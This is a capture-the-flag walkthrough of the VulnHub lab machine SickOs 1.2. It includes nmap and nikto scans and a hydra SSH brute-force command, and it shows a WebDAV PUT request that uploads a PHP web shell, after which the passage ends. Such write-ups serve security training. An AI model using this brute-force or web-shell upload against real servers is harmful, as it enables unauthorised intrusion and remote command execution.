@@ -1,0 +1,82 @@
+*SickOs 1.2*narrative
+    This CTF gives a clear analogy how hacking strategies can be performed on a network to compromise it in a safe environment. This vm is very similar to labs I faced in OSCP. The objective being to compromise the network/machine and gain Administrative/root privileges on them. https://www.vulnhub.com/entry/sickos-11,132/
+
+
+Level 1.2
+    We do a discovery scan with nmap to find the IP addresses
+    *# nmap -sP 192.168.252.1/24
+
+Starting Nmap 7.50 ( https://nmap.org ) at 2017-09-21 20:25 BST
+Nmap scan report for 192.168.252.134
+Host is up (-0.10s latency).
+MAC Address: 00:0C:29:CB:55:50 (VMware)*
+
+    Next, we do a service discovery scan.
+
+    *# nmap -sV -A 192.168.252.134
+
+Starting Nmap 7.50 ( https://nmap.org ) at 2017-09-21 20:28 BST
+Nmap scan report for 192.168.252.134
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    lighttpd 1.4.28
+|_http-server-header: lighttpd/1.4.28
+|_http-title: Site doesn't have a title (text/html).
+OS details: Linux 3.10 - 4.8, Linux 3.16 - 4.6, Linux 3.2 - 4.8, Linux 4.4
+Nmap done: 1 IP address (1 host up) scanned in 26.75 seconds*
+
+    So again, the attack surface is very limited, we browse the web server. The main page only has an image. We run a directory discovery scan. it find some directories such as:
+
+    */test
+    /index.php
+    /~sys~ # forbidden*
+
+    Nothing useful, in a response header, the server claims to be running *PHP/5.3.10-1ubuntu3.21*. It seems an old version of PHP, I look for exploits on the Internet and try a few.
+
+    I run out of ideas, set up a ssh bruteforce attack:
+
+    *hydra -l root -P /usr/share/wordlists/metasploit/password.lst 192.168.252.134 ssh*
+
+    I take a look again a the web server, I proxy the browser and open all the discovered direcotries and files, and see how the responses look like in Burp. Found nothing interesting. I run nikito and nmap scripts.
+
+    *nikto -h 192.168.252.134
+nmap -Pn -sV -O -pT:22,80 --script *http* 192.168.252.134*
+
+    Nothing useful. I go back to the web server. The best clues so far are the directories found earlier. I monkey with the requests in Burp repeater, until I try an OPTIONS request and boom something useful.
+
+    *OPTIONS /test/ HTTP/1.1
+Host: 192.168.252.134
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+HTTP/1.1 200 OK
+DAV: 1,2
+MS-Author-Via: DAV
+Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
+Allow: OPTIONS, GET, HEAD, POST
+Content-Length: 0
+Connection: close
+Date: Thu, 21 Sep 2017 21:09:45 GMT
+Server: lighttpd/1.4.28*
+
+    The obvious next step is try to upload a file with PUT.
+
+    *PUT /test/shell.php HTTP/1.1
+Host: 192.168.252.134
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 62
+
+<?php echo '<pre>'; system($_GET['cmd']); echo '</pre>'; ?>
+
+HTTP/1.1 201 Created
+Content-Length: 0
+Connection: close
+Date: Thu, 21 Sep 2017 21:11:41 GMT
+Server: lighttpd/1.4.28*
